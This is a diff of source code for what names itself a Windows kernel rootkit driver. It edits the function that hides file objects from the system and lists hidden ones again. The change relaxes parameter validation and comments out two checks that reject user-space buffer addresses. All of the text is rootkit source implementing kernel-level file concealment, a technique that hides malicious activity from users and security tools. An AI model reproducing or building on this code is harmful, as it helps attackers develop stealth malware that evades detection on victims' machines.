@@ -662,7 +662,7 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 
 	// Check for invalid arguments:
 	if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN || (ULONG64)RootkInst->Reserved == HIDE_FILE) {
-		if ((RootkInst->Out == NULL && (ULONG64)RootkInst->Reserved == HIDE_FILE) || RootkInst->Buffer == NULL || (RootkInst->MedPID == 0 && RootkInst->MainPID == 0) || RootkInst->Size == 0) {
+		if ((RootkInst->Out == NULL && (ULONG64)RootkInst->Reserved == HIDE_FILE) || RootkInst->Buffer == NULL || (RootkInst->MedPID == 0 && RootkInst->MainPID == 0) || RootkInst->Size == 0 && (ULONG64)RootkInst->Reserved != SHOW_HIDDEN) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (one or more invalid parameters: %p, %p, %hu, %hu, %llu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->MedPID, RootkInst->MainPID, RootkInst->Size);
 			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
@@ -675,16 +675,16 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source string address %p is in systemspace)\n", RootkInst->Buffer);
 			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		if ((ULONG64)RootkInst->Out < memory_helpers::GetHighestUserModeAddrADD()) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination string address %p is in userspace)\n", RootkInst->Out);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		}
+		//if ((ULONG64)RootkInst->Out < memory_helpers::GetHighestUserModeAddrADD()) {
+		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination string address %p is in userspace)\n", RootkInst->Out);
+		//	return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		//}
 	}
 	else if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN) {
-		if ((ULONG64)RootkInst->Buffer < memory_helpers::GetHighestUserModeAddrADD()) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source list address %p is in userspace)\n", RootkInst->Buffer);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		}
+		//if ((ULONG64)RootkInst->Buffer < memory_helpers::GetHighestUserModeAddrADD()) {
+		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source list address %p is in userspace)\n", RootkInst->Buffer);
+		//	return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		//}
 		if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD()) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination list address %p is in systemspace)\n", RootkInst->Out);
 			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
